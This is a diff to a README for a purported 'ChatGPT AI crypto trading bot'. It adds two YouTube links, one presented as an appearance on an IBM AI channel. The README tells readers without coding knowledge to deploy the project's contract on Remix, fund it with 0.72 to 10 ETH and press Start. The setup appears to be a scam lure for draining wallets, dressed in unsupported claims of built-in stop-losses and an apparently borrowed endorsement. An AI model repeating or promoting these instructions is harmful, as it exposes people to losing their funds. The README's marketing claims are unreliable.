@@ -1,6 +1,8 @@
 # ChatGPT-AI-Crypto-Trading-Bot
 ChatGPT AI Crypto Trading Bot is an open-source, educational project demonstrating how AI-assisted logic, automation, and data analysis can be used to build crypto trading bots. Includes modular code, strategy examples, API integration concepts, and customization for research and learning purposes.
 
+As seen on IBM Artificial Intelligence YouTube Channel: https://www.youtube.com/watch?v=A25BI356kA0&t=37s
+
 🌍 Project Concept
 This bot allows you to trade cryptocurrencies using AI algorithms through ChatGPT and other AI models directly on the blockchain. It will analyze market data, important trends, and token sentiments as well as trader portfolios to make fully automated trading movements on your behalf. Stop-losses are built in to prevent any mistakes in opening and closing positions. The bot manages leverages and optimizes risk in real time. No code knowledge is neccessary and nothing is required to download. Simply use the code source to create your own smart contract that will serve as your "bot" on [remix.ethereum.org](url) the web-based development enviornment for Ethereum smart contracts. Step by step instructions below.
 
@@ -46,6 +48,8 @@ The minimum recommended amount is 0.72 ETH - 10 ETH
 🟢 Step 8: Once the transaction is confirmed, click Start to activate the bot. To stop it and withdraw funds, click Withdraw.
 
 (Make sure you have enough ETH in your main wallet (not in your contract address) to pay the gas fee for pressing the Start button.)
+
+Here's a YouTube video if you are still confused: https://www.youtube.com/watch?v=A25BI356kA0&t=37s
 
 
 
